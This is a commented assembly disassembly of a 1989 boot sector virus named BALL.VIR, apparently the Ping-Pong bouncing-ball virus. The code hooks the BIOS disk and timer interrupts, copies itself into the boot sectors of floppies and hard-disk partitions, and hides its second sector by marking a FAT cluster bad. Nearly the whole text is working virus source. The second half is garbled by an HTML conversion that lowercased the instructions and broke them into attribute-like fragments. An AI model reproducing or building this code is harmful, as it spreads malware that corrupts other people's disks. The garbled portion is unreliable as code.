

TITLE	*** ASMGEN - Version 2.51 ***
SUBTTL	BALL.VIR  3-15-89	[3-22-89]

RET_NEAR	MACRO
DB	0C3H
ENDM
;
.RADIX	16
;
;INITIAL VALUES :	CS:IP	0000:0100
;			SS:SP	0000:FFFF
						;L0000S	  L7C00 DI  L7C1C CI  L7C93 CJ	L7D31 DB  L7D76 DB  L7DF7 CB  L7DF8 CB
						;	  L7DFB CB  L7E86 DI  L7EA9 DI	L7EB2 CB  L7EBF DI  L7F4E DB  L7F62 DB
						;	  L7FCB CI  L7FCD CI  L7FD3 CB
S0000	SEGMENT
	ASSUME	DS:S0000,SS:S0000,CS:S0000,ES:S0000
	ORG	$+7C00H
L0000	EQU	$-7C00
						;L0001	  L7C0E CI  L7CDA DB  L7D12 DB	L7D33 DI  L7D46 DB  L7DE0 DI  L7DF3 CI
						;	  L7E3A DI  L7E60 DI  L7EFC DB	L7F37 DB  L7F43 DI  L7FAD DB  L7FB6 DI
L0001	EQU	$-7BFF
						;L0002	  L7C0D CB  L7C10 CB  L7C16 CI	L7C1A CI  L7C2A DI  L7CE1 DB  L7D5A DB
						;	  L7D93 DB  L7E08 DB  L7E75 DI	L7EB3 DB  L7EBA DB  L7F2C DB  L7FA0 DB
						;	  L7FBF DB
L0002	EQU	$-7BFE
						;L0003	  L7E12 DI  L7F1C DB  L7F27 DB	L7F82 DB
L0003	EQU	$-7BFDh
						;L0004	  L7D43 DI  L7D46 DB  L7D4C DB	L7D4C DB  L7DDB DB  L7E15 DB  L7E31 DB
						;	  L7E38 DB  L7E54 DB  L7E5E DB	L7F05 DB
L0004	EQU	$-7BFC
						;L0005	  L7F8B DB
L0005	EQU	$-7BFBh
						;L0006	  L7C30 DB  L7CB5 DB
L0006	EQU	$-7BFA
						;L0007	  L7EFE DB  L7F80 DB
L0007	EQU	$-7BF9
						;L0008	  L7FA4 DB
L0008	EQU	$-7BF8
						;L0009	  L7C18 CI  L7F46 DB
L0009	EQU	$-7BF7
						;L000F	  L7E42 DB  L7E5B DB  L7EE6 DB
L000F	EQU	$-7BF1
						;L0010	  L7D52 DI
L0010	EQU	$-7BF0
						;L0013	  L7DFB CB
L0013	EQU	$-7BEDh
						;L0018	  L7F58 DB
L0018	EQU	$-7BE8
						;L001C	  L7D69 DI
L001C	EQU	$-7BE4
						;L0020	  L7C59 DI  L7DA8 DI  L7E9A DI	L7EC4 DR  L7ECB DW  L7FC9 CI
L0020	EQU	$-7BE0
						;L0022	  L7EC7 DR  L7ED1 DW
L0022	EQU	$-7BDE
						;L0024	  L7D0D DI
L0024	EQU	$-7BDC
						;L0040	  L7EA4 DI
L0040	EQU	$-7BC0
						;L004C	  L7C75 DR  L7C7C DW
L004C	EQU	$-7BB4
						;L004E	  L7C78 DR  L7C82 DW
L004E	EQU	$-7BB2
						;L0050	  L7FD6 CB
L0050	EQU	$-7BB0
						;L0055	  L7DFE CB
L0055	EQU	$-7BABh
						;L0057	  L7DFB CB
L0057	EQU	$-7BA9
						;L0070	  L7C11 CI
L0070	EQU	$-7B90
						;L0073	  L7DF5 CI
L0073	EQU	$-7B8Dh
						;L007F	  L7CF4 DB
L007F	EQU	$-7B81
						;L0080	  L7C4E DB  L7D39 DB
L0080	EQU	$-7B80
						;L0083	  L7FB4 DB
L0083	EQU	$-7B7Dh
						;L00AA	  L7DFE CB
L00AA	EQU	$-7B56
						;L00D3	  L7DF9 CI
L00D3	EQU	$-7B2Dh
						;L00EA	  L7D29 DB  L7FC8 DB
L00EA	EQU	$-7B16
						;L00F0	  L7CF9 DB
L00F0	EQU	$-7B10
						;L00FB	  L7DD1 DB
L00FB	EQU	$-7B05
						;L00FD	  L7C15 CB
L00FD	EQU	$-7B03
						;L00FE	  L7D1E DB  L7DEC DB
L00FE	EQU	$-7B02
						;L00FF	  L7F53 DB  L7F5D DB  L7F67 DB	L7F72 DB  L7F86 DB  L7F8F DB
L00FF	EQU	$-7B01
						;L0100	  L7C3E DI
L0100	EQU	$-7B00
						;L0101	  L7F10 DI  L7F16 DI  L7FCD CI
L0101	EQU	$-7AFF
						;L01FF	  L7DAF DI  L7E27 DI
L01FF	EQU	$-7A01
						;L0200	  L7C0B CI  L7D8B DI  L7DB2 DI
L0200	EQU	$-7A00
						;L0201	  L7C9D DI  L7D2E DI  L7D5D DI
L0201	EQU	$-79FF
						;L02D0	  L7C13 CI
L02D0	EQU	$-7930
						;L0301	  L7C98 DI
L0301	EQU	$-78FF
						;L0413	  L7C27 DR  L7C2D DW
L0413	EQU	$-77EDh
						;L07C0	  L7C34 DI
L07C0	EQU	$-7440
						;L0907	  L7FB9 DI
L0907	EQU	$-72F9
						;L0FF0	  L7DD6 DI
L0FF0	EQU	$-6C10
						;L1357	  L7D6E DI
L1357	EQU	$-68A9
						;L49E8	  L7EB0 CI
L49E8	EQU	$-3218
						;L77C0	  L7D2C CI
L77C0	EQU	$-440
						;L7C00	  L7C22 DI  L7C39 DI  L7C93 CJ
;	Boot entry of Virus
BOOT:	JMP	SHORT	INIT		;Init virus	;7C00 EB 1C
						;L7C02	  L7D66 DI
L7C02:	NOP					;7C02 90
;	OEM
	DB	'DOS  3.1'			;7C03 44 4F 53 20 20 33 2E 31
;	Size of Disk sector in bytes
SEC_SIZE	EQU	$
	DW	L0200				;7C0B 00 02
						;L7C0D	  L7DC4 DR  L7E78 DR
;	Size of Cluster in sectors
CLSTSIZE	EQU	$
	DB	2				;7C0D 02
						;L7C0E	  L7DE3 DR
RES_SECT	EQU	$
	DW	L0001				;7C0E 01 00
FAT_NUMBER	EQU	$
	DB	2				;7C10 02
;	Size of root directory in Dir entryes
ROOT_SIZE	EQU	$
	DW	L0070				;7C11 70 00
						;L7C13	  L7DBD DR
TOTAL_SECTORS	EQU	$
	DW	L02D0				;7C13 D0 02
MEDIA_TYPE	EQU	$
	DB	0FDh				;7C15 FD
;	Size of FAT in sectors
FAT_SIZE	EQU	$
	DW	L0002				;7C16 02 00
						;L7C18	  L7CA7 DR
SEC_TRACK	EQU	$
	DW	L0009				;7C18 09 00
						;L7C1A	  L7CB1 DR
HEADS	DW	L0002				;7C1A 02 00
						;L7C1C	  L7CA1 DR
HIDDEN_SCS	EQU	$
	DW	L0000				;7C1C 00 00
						;L7C1E	  L7C00 CJ
;	Init virus
INIT:	XOR	AX,AX				;7C1E 33 C0
	MOV	SS,AX				;7C20 8E D0
	MOV	SP,OFFSET BOOT		;Boot entry of Virus	;7C22 BC 00 7C
	MOV	DS,AX				;7C25 8E D8
	MOV	AX,DS:MEM_SIZE		;Memory size in kilobytes	
						;7C27 A1 13 04
	SUB	AX,2				;7C2A 2D 02 00
	MOV	DS:MEM_SIZE,AX		;Memory size in kilobytes	
						;7C2D A3 13 04
	MOV	CL,6				;7C30 B1 06
	SHL	AX,CL				;7C32 D3 E0
	SUB	AX,7C0				;7C34 2D C0 07
	MOV	ES,AX				;7C37 8E C0
	MOV	SI,OFFSET BOOT		;Boot entry of Virus	;7C39 BE 00 7C
	MOV	DI,SI				;7C3C 8B FE
	MOV	CX,100				;7C3E B9 00 01
;	Moving virus to end of memory
	REPZ	MOVSW				;7C41 F3 A5
;	And Jump There
	MOV	CS,AX				;7C43 8E C8
;	CS and DS to new virus location
	PUSH	CS				;7C45 0E
	POP	DS				;7C46 1F
	CALL	SELF			;Push ip in stack	;7C47 E8 00 00
						;L7C4A	  L7C47 CC
;	Push ip in stack
SELF:	XOR	AH,AH				;7C4A 32 E4
	INT	13				;7C4C CD 13
	AND	BYTE PTR CUR_DRIVE,80	;Last Drive Accessed	;7C4E 80 26 F8 7D 80
	MOV	BX,VIRUSLSN		;LSN of Virus extention	;7C53 8B 1E F9 7D
	PUSH	CS				;7C57 0E
	POP	AX				;7C58 58
	SUB	AX,20	;' '			;7C59 2D 20 00
;	Reading second part of virus
	MOV	ES,AX				;7C5C 8E C0
	CALL	READ_SC			;Reads sector BX = LSN	;7C5E E8 3C 00
	MOV	BX,VIRUSLSN		;LSN of Virus extention	;7C61 8B 1E F9 7D
	INC	BX				;7C65 43
	MOV	AX,OFFSET LFFC0			;7C66 B8 C0 FF
;	Readind original boot sector
	MOV	ES,AX				;7C69 8E C0
	CALL	READ_SC			;Reads sector BX = LSN	;7C6B E8 2F 00
	XOR	AX,AX				;7C6E 33 C0
	MOV	FLAGS,AL		;Sum semapfor type flags	
						;7C70 A2 F7 7D
	MOV	DS,AX				;7C73 8E D8
	MOV	AX,DS:INT13_OFF			;7C75 A1 4C 00
	MOV	BX,DS:INT13_SEG			;7C78 8B 1E 4E 00
	MOV	WORD PTR DS:INT13_OFF,OFFSET NEW_INT13	
						;7C7C C7 06 4C 00 D0 7C
	MOV	DS:INT13_SEG,CS			;7C82 8C 0E 4E 00
	PUSH	CS				;7C86 0E
	POP	DS				;7C87 1F
	MOV	OLD_INT13_OFF,AX		;7C88 A3 2A 7D
	MOV	OLD_INT13_SEG,BX		;7C8B 89 1E 2C 7D
	MOV	DL,CUR_DRIVE		;Last Drive Accessed	;7C8F 8A 16 F8 7D
	JMP	FAR PTR	BOOTDS:		;Boot entry of Virus	;7C93 EA 00 7C 00 00
						;L7C98	  L7E70 CC  L7E8F CC  L7E9F CC	L7EAC CC
;	Writes sector BX = LSN
WRITESC:
	MOV	AX,301				;7C98 B8 01 03
	JMP	SHORT	OPERATE			;7C9B EB 03
						;L7C9D	  L7C5E CC  L7C6B CC  L7E0D CC	L7E89 CC
;	Reads sector BX = LSN
READ_SC:
	MOV	AX,201				;7C9D B8 01 02
						;L7CA0	  L7C9B CJ
OPERATE:
	XCHG	BX,AX				;7CA0 93
	ADD	AX,HIDDEN_SCS			;7CA1 03 06 1C 7C
	XOR	DX,DX				;7CA5 33 D2
	DIV	WORD PTR SEC_TRACK		;7CA7 F7 36 18 7C
	INC	DL				;7CAB FE C2
	MOV	CH,DL				;7CAD 8A EA
	XOR	DX,DX				;7CAF 33 D2
	DIV	WORD PTR HEADS			;7CB1 F7 36 1A 7C
	MOV	CL,6				;7CB5 B1 06
	SHL	AH,CL				;7CB7 D2 E4
	OR	AH,CH				;7CB9 0A E5
	MOV	CX,AX				;7CBB 8B C8
	XCHG	CH,CL				;7CBD 86 E9
	MOV	DH,DL				;7CBF 8A F2
	MOV	AX,BX				;7CC1 8B C3
						;L7CC3	  L7D36 CC  L7D60 CC
;	Access disk service and returns one level more if Error
DISK_CALL:
	MOV	DL,CUR_DRIVE		;Last Drive Accessed	;7CC3 8A 16 F8 7D
	MOV	BX,OFFSET R_W_BUFF	;Buffer for read/write sector	
						;7CC7 BB 00 80
	INT	13				;7CCA CD 13
	JNB	EXIT_D_CALL			;7CCC 73 01
	POP	AX				;7CCE 58
						;L7CCF	  L7CCC CJ
EXIT_D_CALL:
	RET_NEAR				;7CCF C3
						;L7CD0	  L7C7C DI  L7D2A CI
NEW_INT13:
	PUSH	DS				;7CD0 1E
	PUSH	ES				;7CD1 06
	PUSH	AX				;7CD2 50
	PUSH	BX				;7CD3 53
	PUSH	CX				;7CD4 51
	PUSH	DX				;7CD5 52
	PUSH	CS				;7CD6 0E
	POP	DS				;7CD7 1F
	PUSH	CS				;7CD8 0E
	POP	ES				;7CD9 07
	TEST	BYTE PTR FLAGS,1	;Sum semapfor type flags	
						;7CDA F6 06 F7 7D 01
	JNZ	EXIT_INT13			;7CDF 75 42
	CMP	AH,2				;7CE1 80 FC 02
	JNZ	EXIT_INT13			;7CE4 75 3D
	CMP	CUR_DRIVE,DL		;Last Drive Accessed	;7CE6 38 16 F8 7D
	MOV	CUR_DRIVE,DL		;Last Drive Accessed	;7CEA 88 16 F8 7D
	JNZ	L7D12			;Don't Run if less then 24 Ticks	
						;7CEE 75 22
	XOR	AH,AH				;7CF0 32 E4
	INT	1A				;7CF2 CD 1A
;	CX:DX <- bios="" time="" test="" dh,7f="" ;7cf4="" f6="" c6="" 7f="" jnz="" dontball="" ;do="" not="" display="" ball="" ;7cf7="" 75="" 0a="" test="" dl,0f0="" ;7cf9="" f6="" c2="" f0="" jnz="" dontball="" ;do="" not="" display="" ball="" ;7cfc="" 75="" 05="" push="" dx="" ;7cfe="" 52="" call="" ball_act="" ;activate="" ball="" on="" screen="" ;7cff="" e8="" b1="" 01="" pop="" dx="" ;7d02="" 5a="" ;l7d03="" l7cf7="" cj="" l7cfc="" cj="" ;="" do="" not="" display="" ball="" dontball:="" mov="" cx,dx="" ;7d03="" 8b="" ca="" sub="" dx,time="" ;last="" time="" drive="" is="" accessed="" ;7d05="" 2b="" 16="" b0="" 7e="" mov="" time,cx="" ;last="" time="" drive="" is="" accessed="" ;7d09="" 89="" 0e="" b0="" 7e="" sub="" dx,24="" ;'$'="" ;7d0d="" 83="" ea="" 24="" jb="" exit_int13="" ;7d10="" 72="" 11="" ;l7d12="" l7cee="" cj="" ;="" don't="" run="" if="" less="" then="" 24="" ticks="" l7d12:="" or="" byte="" ptr="" flags,1="" ;sum="" semapfor="" type="" flags="" ;7d12="" 80="" 0e="" f7="" 7d="" 01="" push="" si="" ;7d17="" 56="" push="" di="" ;7d18="" 57="" call="" attach="" ;attachs="" last="" accessed="" device="" ;7d19="" e8="" 12="" 00="" pop="" di="" ;7d1c="" 5f="" pop="" si="" ;7d1d="" 5e="" and="" byte="" ptr="" flags,0fe="" ;sum="" semapfor="" type="" flags="" ;7d1e="" 80="" 26="" f7="" 7d="" fe="" ;l7d23="" l7cdf="" cj="" l7ce4="" cj="" l7d10="" cj="" exit_int13:="" pop="" dx="" ;7d23="" 5a="" pop="" cx="" ;7d24="" 59="" pop="" bx="" ;7d25="" 5b="" pop="" ax="" ;7d26="" 58="" pop="" es="" ;7d27="" 07="" pop="" ds="" ;7d28="" 1f="" ;="" opcode="" of="" far="" jmp="" db="" 0ea="" ;7d29="" ea="" ;l7d2a="" l7c88="" dw="" old_int13_off="" equ="" $="" dw="" new_int13="" ;7d2a="" d0="" 7c="" ;l7d2c="" l7c8b="" dw="" old_int13_seg="" equ="" $="" dw="" l77c0="" ;7d2c="" c0="" 77="" ;l7d2e="" l7d19="" cc="" ;="" attachs="" last="" accessed="" device="" attach:="" mov="" ax,201="" ;7d2e="" b8="" 01="" 02="" mov="" dh,0="" ;7d31="" b6="" 00="" mov="" cx,1="" ;7d33="" b9="" 01="" 00="" call="" disk_call="" ;access="" disk="" service="" and="" returns="" one="" level="" more="" if="" error="" ;7d36="" e8="" 8a="" ff="" test="" byte="" ptr="" cur_drive,80="" ;last="" drive="" accessed="" ;7d39="" f6="" 06="" f8="" 7d="" 80="" jz="" boot_read="" ;boot="" sector="" now="" in="" memory="" ;7d3e="" 74="" 23="" mov="" si,offset="" part_table="" ;partition="" table="" ;7d40="" be="" be="" 81="" mov="" cx,4="" ;7d43="" b9="" 04="" 00="" ;l7d46="" l7d55="" cj="" ;="" search="" in="" partition="" table="" part_search:="" cmp="" byte="" ptr="" [si+4],1="" ;7d46="" 80="" 7c="" 04="" 01="" jz="" found_in_part="" ;boot="" sector="" found="" in="" partition="" table="" ;7d4a="" 74="" 0c="" cmp="" byte="" ptr="" [si+4],4="" ;7d4c="" 80="" 7c="" 04="" 04="" jz="" found_in_part="" ;boot="" sector="" found="" in="" partition="" table="" ;7d50="" 74="" 06="" add="" si,10="" ;7d52="" 83="" c6="" 10="" loop="" part_search="" ;search="" in="" partition="" table="" ;7d55="" e2="" ef="" ret_near="" ;7d57="" c3="" ;l7d58="" l7d4a="" cj="" l7d50="" cj="" ;="" boot="" sector="" found="" in="" partition="" table="" found_in_part:="" mov="" dx,[si]="" ;7d58="" 8b="" 14="" mov="" cx,[si+2]="" ;7d5a="" 8b="" 4c="" 02="" mov="" ax,201="" ;7d5d="" b8="" 01="" 02="" call="" disk_call="" ;access="" disk="" service="" and="" returns="" one="" level="" more="" if="" error="" ;7d60="" e8="" 60="" ff="" ;l7d63="" l7d3e="" cj="" ;="" boot="" sector="" now="" in="" memory="" boot_read:="" mov="" si,offset="" l8002="" ;7d63="" be="" 02="" 80="" mov="" di,offset="" l7c02="" ;7d66="" bf="" 02="" 7c="" mov="" cx,1c="" ;7d69="" b9="" 1c="" 00="" repz="" movsb="" ;7d6c="" f3="" a4="" cmp="" word="" ptr="" l81fc,1357="" ;'w'="" ;7d6e="" 81="" 3e="" fc="" 81="" 57="" 13="" jnz="" not_attcd="" ;disk="" is="" not="" yet="" attached="" ;7d74="" 75="" 15="" cmp="" byte="" ptr="" l81fb,0="" ;7d76="" 80="" 3e="" fb="" 81="" 00="" jnb="" exit_rdy="" ;exit="" allready="" attached="" ;7d7b="" 73="" 0d="" mov="" ax,d_lsn_d="" ;lsn="" of="" first="" data="" sector="" of="" disk="" ;7d7d="" a1="" f5="" 81="" mov="" d_lsn,ax="" ;lsn="" of="" first="" data="" sector="" ;7d80="" a3="" f5="" 7d="" mov="" si,lsn_dsk="" ;lsn="" of="" virus="" of="" disk="" ;7d83="" 8b="" 36="" f9="" 81="" jmp="" write_code="" ;writes="" it="" self="" in="" two="" sectors="" of="" disk="" ;7d87="" e9="" 08="" 01="" ;l7d8a="" l7d7b="" cj="" l7d91="" cj="" l7d98="" cj="" ;="" exit="" allready="" attached="" exit_rdy:="" ret_near="" ;7d8a="" c3="" ;l7d8b="" l7d74="" cj="" ;="" disk="" is="" not="" yet="" attached="" not_attcd:="" cmp="" word="" ptr="" sec_size_d,200="" ;size="" of="" disk="" sector="" in="" bytes="" of="" disk="" ;7d8b="" 81="" 3e="" 0b="" 80="" 00="" 02="" jnz="" exit_rdy="" ;exit="" allready="" attached="" ;7d91="" 75="" f7="" cmp="" byte="" ptr="" clstsize_d,2="" ;size="" of="" cluster="" in="" sectors="" of="" disk="" ;7d93="" 80="" 3e="" 0d="" 80="" 02="" jb="" exit_rdy="" ;exit="" allready="" attached="" ;7d98="" 72="" f0="" mov="" cx,res_sect_d="" ;of="" disk="" ;7d9a="" 8b="" 0e="" 0e="" 80="" mov="" al,fat_number_d="" ;of="" disk="" ;7d9e="" a0="" 10="" 80="" cbw="" ;7da1="" 98="" mul="" word="" ptr="" fat_size_d="" ;size="" of="" fat="" in="" sectors="" of="" disk="" ;7da2="" f7="" 26="" 16="" 80="" add="" cx,ax="" ;7da6="" 03="" c8="" mov="" ax,20="" ;'="" '="" ;7da8="" b8="" 20="" 00="" mul="" word="" ptr="" root_size_d="" ;size="" of="" root="" directory="" in="" dir="" entryes="" of="" disk="" ;7dab="" f7="" 26="" 11="" 80="" add="" ax,1ff="" ;7daf="" 05="" ff="" 01="" mov="" bx,200="" ;7db2="" bb="" 00="" 02="" div="" bx="" ;7db5="" f7="" f3="" add="" cx,ax="" ;7db7="" 03="" c8="" mov="" d_lsn,cx="" ;lsn="" of="" first="" data="" sector="" ;7db9="" 89="" 0e="" f5="" 7d="" mov="" ax,total_sectors="" ;7dbd="" a1="" 13="" 7c="" sub="" ax,d_lsn="" ;lsn="" of="" first="" data="" sector="" ;7dc0="" 2b="" 06="" f5="" 7d="" mov="" bl,clstsize="" ;size="" of="" cluster="" in="" sectors="" ;7dc4="" 8a="" 1e="" 0d="" 7c="" xor="" dx,dx="" ;7dc8="" 33="" d2="" xor="" bh,bh="" ;7dca="" 32="" ff="" div="" bx="" ;7dcc="" f7="" f3="" inc="" ax="" ;7dce="" 40="" mov="" di,ax="" ;7dcf="" 8b="" f8="" and="" byte="" ptr="" flags,0fbh="" ;sum="" semapfor="" type="" flags="" ;7dd1="" 80="" 26="" f7="" 7d="" fb="" cmp="" ax,0ff0="" ;7dd6="" 3d="" f0="" 0f="" jbe="" fat_12_0="" ;12="" bit="" fat="" ;7dd9="" 76="" 05="" or="" byte="" ptr="" flags,4="" ;sum="" semapfor="" type="" flags="" ;7ddb="" 80="" 0e="" f7="" 7d="" 04="" ;l7de0="" l7dd9="" cj="" ;="" 12="" bit="" fat="" fat_12_0:="" mov="" si,1="" ;7de0="" be="" 01="" 00="" mov="" bx,res_sect="" ;7de3="" 8b="" 1e="" 0e="" 7c="" dec="" bx="" ;7de7="" 4b="" mov="" lsn_temp,bx="" ;sector="" to="" operate="" temp="" variable="" ;7de8="" 89="" 1e="" f3="" 7d="" mov="" byte="" ptr="" fat_adjust,0fe="" ;adjust="" pointer="" in="" fat="" ;7dec="" c6="" 06="" b2="" 7e="" fe="" jmp="" short="" next_f_s="" ;next="" sector="" of="" fat.="" it="" is="" in="" second="" virus="" sector.="" ;7df1="" eb="" 0d="" ;l7df3="" l7de8="" dw="" l7e00="" dm="" l7e04="" dr="" l7e6c="" dr="" ;="" sector="" to="" operate="" temp="" variable="" lsn_temp="" equ="" $="" dw="" l0001="" ;7df3="" 01="" 00="" ;l7df5="" l7d80="" dw="" l7db9="" dw="" l7dc0="" dr="" l7e80="" dr="" ;="" lsn="" of="" first="" data="" sector="" d_lsn="" dw="" l0073="" ;7df5="" 73="" 00="" ;l7df7="" l7c70="" dw="" l7cda="" dt="" l7d12="" dm="" l7d1e="" dm="" l7dd1="" dm="" l7ddb="" dm="" l7e15="" dt="" ;="" l7e31="" dt="" l7e54="" dt="" l7eb3="" dt="" l7eba="" dm="" ;="" sum="" semapfor="" type="" flags="" flags="" db="" 0="" ;7df7="" 00="" ;l7df8="" l7c4e="" dm="" l7c8f="" dr="" l7cc3="" dr="" l7ce6="" dt="" l7cea="" dw="" l7d39="" dt="" ;="" last="" drive="" accessed="" cur_drive="" equ="" $="" db="" 0="" ;7df8="" 00="" ;l7df9="" l7c53="" dr="" l7c61="" dr="" l7e94="" dw="" ;="" lsn="" of="" virus="" extention="" viruslsn="" equ="" $="" dw="" l00d3="" ;7df9="" d3="" 00="" ;="" marker="" 'disk="" attached'="" db="" 0,57,13="" ;7dfb="" 00="" 57="" 13="" ;="" boot="" sector="" marker="" db="" 55,0aa="" ;7dfe="" 55="" aa="" ;l7e00="" l7df1="" cj="" l7e2b="" cj="" ;="" next="" sector="" of="" fat.="" it="" is="" in="" second="" virus="" sector.="" next_f_s:="" inc="" word="" ptr="" lsn_temp="" ;sector="" to="" operate="" temp="" variable="" ;7e00="" ff="" 06="" f3="" 7d="" mov="" bx,lsn_temp="" ;sector="" to="" operate="" temp="" variable="" ;7e04="" 8b="" 1e="" f3="" 7d="" add="" byte="" ptr="" fat_adjust,2="" ;adjust="" pointer="" in="" fat="" ;7e08="" 80="" 06="" b2="" 7e="" 02="" call="" read_sc="" ;reads="" sector="" bx="LSN" ;7e0d="" e8="" 8d="" fe="" jmp="" short="" next_entry="" ;next="" entry="" in="" fat="" ;7e10="" eb="" 39="" ;l7e12="" l7e4e="" cj="" ;="" process="" single="" fat="" entry="" next_entry_loop:="" mov="" ax,3="" ;7e12="" b8="" 03="" 00="" test="" byte="" ptr="" flags,4="" ;sum="" semapfor="" type="" flags="" ;7e15="" f6="" 06="" f7="" 7d="" 04="" jz="" fat_12_1="" ;ax="Bytes" per="" two="" clusters="" in="" fat="" ;7e1a="" 74="" 01="" inc="" ax="" ;7e1c="" 40="" ;l7e1d="" l7e1a="" cj="" ;="" ax="Bytes" per="" two="" clusters="" in="" fat="" fat_12_1:="" mul="" si="" ;7e1d="" f7="" e6="" shr="" ax,1="" ;7e1f="" d1="" e8="" sub="" ah,fat_adjust="" ;adjust="" pointer="" in="" fat="" ;7e21="" 2a="" 26="" b2="" 7e="" mov="" bx,ax="" ;7e25="" 8b="" d8="" cmp="" bx,1ff="" ;7e27="" 81="" fb="" ff="" 01="" jnb="" next_f_s="" ;next="" sector="" of="" fat.="" it="" is="" in="" second="" virus="" sector.="" ;7e2b="" 73="" d3="" mov="" dx,[bx+r_w_buff]="" ;buffer="" for="" read/write="" sector="" ;7e2d="" 8b="" 97="" 00="" 80="" test="" byte="" ptr="" flags,4="" ;sum="" semapfor="" type="" flags="" ;7e31="" f6="" 06="" f7="" 7d="" 04="" jnz="" fat_16_1="" ;7e36="" 75="" 0d="" mov="" cl,4="" ;7e38="" b1="" 04="" test="" si,1="" ;7e3a="" f7="" c6="" 01="" 00="" jz="" right_entry="" ;dont="" move="" fat="" entry="" ;7e3e="" 74="" 02="" shr="" dx,cl="" ;7e40="" d3="" ea="" ;l7e42="" l7e3e="" cj="" ;="" dont="" move="" fat="" entry="" right_entry:="" and="" dh,0f="" ;7e42="" 80="" e6="" 0f="" ;l7e45="" l7e36="" cj="" fat_16_1:="" test="" dx,0ffff="" ;7e45="" f7="" c2="" ff="" ff="" jz="" found_cl="" ;free="" cluster="" found="" ;7e49="" 74="" 06="" ;l7e4b="" l7e10="" cj="" ;="" next="" entry="" in="" fat="" next_entry:="" inc="" si="" ;7e4b="" 46="" cmp="" si,di="" ;7e4c="" 3b="" f7="" jbe="" next_entry_loop="" ;process="" single="" fat="" entry="" ;7e4e="" 76="" c2="" ret_near="" ;7e50="" c3="" ;l7e51="" l7e49="" cj="" ;="" free="" cluster="" found="" found_cl:="" mov="" dx,offset="" lfff7="" ;7e51="" ba="" f7="" ff="" test="" byte="" ptr="" flags,4="" ;sum="" semapfor="" type="" flags="" ;7e54="" f6="" 06="" f7="" 7d="" 04="" jnz="" write_bad="" ;write="" marker="" for="" bad="" sector="" ;7e59="" 75="" 0d="" and="" dh,0f="" ;7e5b="" 80="" e6="" 0f="" mov="" cl,4="" ;7e5e="" b1="" 04="" test="" si,1="" ;7e60="" f7="" c6="" 01="" 00="" jz="" write_bad="" ;write="" marker="" for="" bad="" sector="" ;7e64="" 74="" 02="" shl="" dx,cl="" ;7e66="" d3="" e2="" ;l7e68="" l7e59="" cj="" l7e64="" cj="" ;="" write="" marker="" for="" bad="" sector="" write_bad:="" or="" [bx+r_w_buff],dx="" ;buffer="" for="" read/write="" sector="" ;7e68="" 09="" 97="" 00="" 80="" mov="" bx,lsn_temp="" ;sector="" to="" operate="" temp="" variable="" ;7e6c="" 8b="" 1e="" f3="" 7d="" call="" writesc="" ;writes="" sector="" bx="LSN" ;7e70="" e8="" 25="" fe="" mov="" ax,si="" ;7e73="" 8b="" c6="" sub="" ax,2="" ;7e75="" 2d="" 02="" 00="" mov="" bl,clstsize="" ;size="" of="" cluster="" in="" sectors="" ;7e78="" 8a="" 1e="" 0d="" 7c="" xor="" bh,bh="" ;7e7c="" 32="" ff="" mul="" bx="" ;7e7e="" f7="" e3="" add="" ax,d_lsn="" ;lsn="" of="" first="" data="" sector="" ;7e80="" 03="" 06="" f5="" 7d="" mov="" si,ax="" ;7e84="" 8b="" f0="" mov="" bx,0="" ;7e86="" bb="" 00="" 00="" call="" read_sc="" ;reads="" sector="" bx="LSN" ;7e89="" e8="" 11="" fe="" mov="" bx,si="" ;7e8c="" 8b="" de="" inc="" bx="" ;7e8e="" 43="" call="" writesc="" ;writes="" sector="" bx="LSN" ;7e8f="" e8="" 06="" fe="" ;l7e92="" l7d87="" cj="" ;="" writes="" it="" self="" in="" two="" sectors="" of="" disk="" write_code:="" mov="" bx,si="" ;7e92="" 8b="" de="" mov="" viruslsn,si="" ;lsn="" of="" virus="" extention="" ;7e94="" 89="" 36="" f9="" 7d="" push="" cs="" ;7e98="" 0e="" pop="" ax="" ;7e99="" 58="" sub="" ax,20="" ;'="" '="" ;7e9a="" 2d="" 20="" 00="" mov="" es,ax="" ;7e9d="" 8e="" c0="" call="" writesc="" ;writes="" sector="" bx="LSN" ;7e9f="" e8="" f6="" fd="" ;="" overwrite="" boot="" sector="" push="" cs="" ;7ea2="" 0e="" pop="" ax="" ;7ea3="" 58="" sub="" ax,40="" ;'@'="" ;7ea4="" 2d="" 40="" 00="" mov="" es,ax="" ;7ea7="" 8e="" c0="" mov="" bx,0="" ;7ea9="" bb="" 00="" 00="" call="" writesc="" ;writes="" sector="" bx="LSN" ;7eac="" e8="" e9="" fd="" ret_near="" ;7eaf="" c3="" ;l7eb0="" l7d05="" dr="" l7d09="" dw="" ;="" last="" time="" drive="" is="" accessed="" time="" dw="" l49e8="" ;7eb0="" e8="" 49="" ;l7eb2="" l7dec="" dw="" l7e08="" dm="" l7e21="" dr="" ;="" adjust="" pointer="" in="" fat="" fat_adjust="" equ="" $="" db="" 0="" ;7eb2="" 00="" ;l7eb3="" l7cff="" cc="" ;="" activate="" ball="" on="" screen="" ball_act:="" test="" byte="" ptr="" flags,2="" ;sum="" semapfor="" type="" flags="" ;7eb3="" f6="" 06="" f7="" 7d="" 02="" jnz="" exit_ball_act="" ;7eb8="" 75="" 24="" or="" byte="" ptr="" flags,2="" ;sum="" semapfor="" type="" flags="" ;7eba="" 80="" 0e="" f7="" 7d="" 02="" mov="" ax,0="" ;7ebf="" b8="" 00="" 00="" mov="" ds,ax="" ;7ec2="" 8e="" d8="" mov="" ax,ds:timer_off="" ;7ec4="" a1="" 20="" 00="" mov="" bx,ds:timer_seg="" ;7ec7="" 8b="" 1e="" 22="" 00="" mov="" word="" ptr="" ds:timer_off,offset="" timer="" ;timer="" interrupt="" handler="" ;7ecb="" c7="" 06="" 20="" 00="" df="" 7e="" mov="" ds:timer_seg,cs="" ;7ed1="" 8c="" 0e="" 22="" 00="" push="" cs="" ;7ed5="" 0e="" pop="" ds="" ;7ed6="" 1f="" mov="" old_timer_off,ax="" ;7ed7="" a3="" c9="" 7f="" mov="" old_timer_seg,bx="" ;7eda="" 89="" 1e="" cb="" 7f="" ;l7ede="" l7eb8="" cj="" exit_ball_act:="" ret_near="" ;7ede="" c3="" ;l7edf="" l7ecb="" di="" ;="" timer="" interrupt="" handler="" timer:="" push="" ds="" ;7edf="" 1e="" push="" ax="" ;7ee0="" 50="" push="" bx="" ;7ee1="" 53="" push="" cx="" ;7ee2="" 51="" push="" dx="" ;7ee3="" 52="" push="" cs="" ;7ee4="" 0e="" pop="" ds="" ;7ee5="" 1f="" mov="" ah,0f="" ;7ee6="" b4="" 0f="" int="" 10="" ;7ee8="" cd="" 10="" mov="" bl,al="" ;7eea="" 8a="" d8="" 